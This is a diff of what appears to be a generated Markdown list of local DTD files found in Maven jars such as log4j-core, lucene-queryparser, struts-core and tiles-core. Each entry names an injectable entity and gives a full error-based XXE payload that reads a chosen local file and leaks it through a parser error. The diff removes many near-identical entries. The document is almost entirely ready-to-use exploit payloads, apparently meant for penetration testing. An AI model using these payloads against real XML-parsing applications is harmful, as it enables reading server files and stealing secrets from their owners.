@@ -70,75 +70,6 @@
 
  --- 
 
-**DTD File:** `[HOME_DIR]/.m2/repository/commons-configuration/commons-configuration/1.6/commons-configuration-1.6.jar!/PropertyList-1.0.dtd`
-
-**Injectable entity:** `%plistObject`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/commons-configuration/commons-configuration/1.6/commons-configuration-1.6.jar!/PropertyList-1.0.dtd">
-
-    <!ENTITY % plistObject '(aa)>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ELEMENT aa "bb"'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
-**DTD File:** `[HOME_DIR]/.m2/repository/commons-configuration/commons-configuration/1.8/commons-configuration-1.8.jar!/PropertyList-1.0.dtd`
-
-**Injectable entity:** `%plistObject`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/commons-configuration/commons-configuration/1.8/commons-configuration-1.8.jar!/PropertyList-1.0.dtd">
-
-    <!ENTITY % plistObject '(aa)>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ELEMENT aa "bb"'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
-**DTD File:** `[HOME_DIR]/.m2/repository/commons-configuration/commons-configuration/1.9/commons-configuration-1.9.jar!/PropertyList-1.0.dtd`
-
-**Injectable entity:** `%plistObject`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/commons-configuration/commons-configuration/1.9/commons-configuration-1.9.jar!/PropertyList-1.0.dtd">
-
-    <!ENTITY % plistObject '(aa)>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ELEMENT aa "bb"'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
 **DTD File:** `[HOME_DIR]/.m2/repository/commons-digester/commons-digester/1.8.1/commons-digester-1.8.1.jar!/org/apache/commons/digester/xmlrules/digester-rules.dtd`
 
 **Injectable entity:** `%rule-elements`
@@ -147,52 +78,6 @@
 ```
 <!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/commons-digester/commons-digester/1.8.1/commons-digester-1.8.1.jar!/org/apache/commons/digester/xmlrules/digester-rules.dtd">
-
-    <!ENTITY % rule-elements 'aaa)>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ELEMENT aa (bb'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
-**DTD File:** `[HOME_DIR]/.m2/repository/commons-digester/commons-digester/2.0/commons-digester-2.0.jar!/org/apache/commons/digester/xmlrules/digester-rules.dtd`
-
-**Injectable entity:** `%rule-elements`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/commons-digester/commons-digester/2.0/commons-digester-2.0.jar!/org/apache/commons/digester/xmlrules/digester-rules.dtd">
-
-    <!ENTITY % rule-elements 'aaa)>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ELEMENT aa (bb'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
-**DTD File:** `[HOME_DIR]/.m2/repository/commons-digester/commons-digester/2.1/commons-digester-2.1.jar!/org/apache/commons/digester/xmlrules/digester-rules.dtd`
-
-**Injectable entity:** `%rule-elements`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/commons-digester/commons-digester/2.1/commons-digester-2.1.jar!/org/apache/commons/digester/xmlrules/digester-rules.dtd">
 
     <!ENTITY % rule-elements 'aaa)>
         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
@@ -277,29 +162,6 @@
 
  --- 
 
-**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/logging/log4j/log4j-core/2.6/log4j-core-2.6.jar!/Log4j-events.dtd`
-
-**Injectable entity:** `%documentElementAttributes`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/logging/log4j/log4j-core/2.6/log4j-core-2.6.jar!/Log4j-events.dtd">
-
-    <!ENTITY % documentElementAttributes '>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ELEMENT aa "bb"'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
 **DTD File:** `[HOME_DIR]/.m2/repository/org/apache/lucene/lucene-queryparser/4.5.1/lucene-queryparser-4.5.1.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd`
 
 **Injectable entity:** `%queries`
@@ -323,121 +185,6 @@
 
  --- 
 
-**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/lucene/lucene-queryparser/5.5.0/lucene-queryparser-5.5.0.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd`
-
-**Injectable entity:** `%queries`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/lucene/lucene-queryparser/5.5.0/lucene-queryparser-5.5.0.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd">
-
-    <!ENTITY % queries 'aaa)>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ELEMENT aa (bb'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
-**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/lucene/lucene-queryparser/6.5.0/lucene-queryparser-6.5.0.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd`
-
-**Injectable entity:** `%queries`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/lucene/lucene-queryparser/6.5.0/lucene-queryparser-6.5.0.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd">
-
-    <!ENTITY % queries 'aaa)>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ELEMENT aa (bb'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
-**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/lucene/lucene-queryparser/6.6.0/lucene-queryparser-6.6.0.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd`
-
-**Injectable entity:** `%queries`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/lucene/lucene-queryparser/6.6.0/lucene-queryparser-6.6.0.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd">
-
-    <!ENTITY % queries 'aaa)>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ELEMENT aa (bb'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
-**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/lucene/lucene-queryparser/6.6.1/lucene-queryparser-6.6.1.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd`
-
-**Injectable entity:** `%queries`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/lucene/lucene-queryparser/6.6.1/lucene-queryparser-6.6.1.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd">
-
-    <!ENTITY % queries 'aaa)>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ELEMENT aa (bb'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
-**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/lucene/lucene-queryparser/7.6.0/lucene-queryparser-7.6.0.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd`
-
-**Injectable entity:** `%queries`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/lucene/lucene-queryparser/7.6.0/lucene-queryparser-7.6.0.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd">
-
-    <!ENTITY % queries 'aaa)>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ELEMENT aa (bb'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
 **DTD File:** `[HOME_DIR]/.m2/repository/org/apache/struts/struts-core/1.3.10/struts-core-1.3.10.jar!/org/apache/struts/resources/struts-config_1_0.dtd`
 
 **Injectable entity:** `%BeanName`
@@ -446,75 +193,6 @@
 ```
 <!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/struts/struts-core/1.3.10/struts-core-1.3.10.jar!/org/apache/struts/resources/struts-config_1_0.dtd">
-
-    <!ENTITY % BeanName '(aa) #IMPLIED>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ATTLIST attxx aa "bb"'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
-**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/struts/struts-core/1.3.8/struts-core-1.3.8.jar!/org/apache/struts/resources/struts-config_1_0.dtd`
-
-**Injectable entity:** `%BeanName`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/struts/struts-core/1.3.8/struts-core-1.3.8.jar!/org/apache/struts/resources/struts-config_1_0.dtd">
-
-    <!ENTITY % BeanName '(aa) #IMPLIED>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ATTLIST attxx aa "bb"'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
-**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/struts/struts-core/1.3.9/struts-core-1.3.9-sources.jar!/org/apache/struts/resources/struts-config_1_0.dtd`
-
-**Injectable entity:** `%BeanName`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/struts/struts-core/1.3.9/struts-core-1.3.9-sources.jar!/org/apache/struts/resources/struts-config_1_0.dtd">
-
-    <!ENTITY % BeanName '(aa) #IMPLIED>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ATTLIST attxx aa "bb"'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
-**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/struts/struts-core/1.3.9/struts-core-1.3.9.jar!/org/apache/struts/resources/struts-config_1_0.dtd`
-
-**Injectable entity:** `%BeanName`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/struts/struts-core/1.3.9/struts-core-1.3.9.jar!/org/apache/struts/resources/struts-config_1_0.dtd">
 
     <!ENTITY % BeanName '(aa) #IMPLIED>
         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
@@ -561,29 +239,6 @@
 ```
 <!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/tiles/tiles-core/3.0.5/tiles-core-3.0.5.jar!/org/apache/tiles/resources/tiles-config_3_0.dtd">
-
-    <!ENTITY % Boolean '(aa) #IMPLIED>
-        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        <!ATTLIST attxx aa "bb"'>
-
-    %local_dtd;
-]>
-<message></message>
-```
-
- --- 
-
-**DTD File:** `[HOME_DIR]/.m2/repository/org/apache/tiles/tiles-core/3.0.7/tiles-core-3.0.7.jar!/org/apache/tiles/resources/tiles-config_3_0.dtd`
-
-**Injectable entity:** `%Boolean`
-
-**XXE Payload:**
-```
-<!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file://[HOME_DIR]/.m2/repository/org/apache/tiles/tiles-core/3.0.7/tiles-core-3.0.7.jar!/org/apache/tiles/resources/tiles-config_3_0.dtd">
 
     <!ENTITY % Boolean '(aa) #IMPLIED>
         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
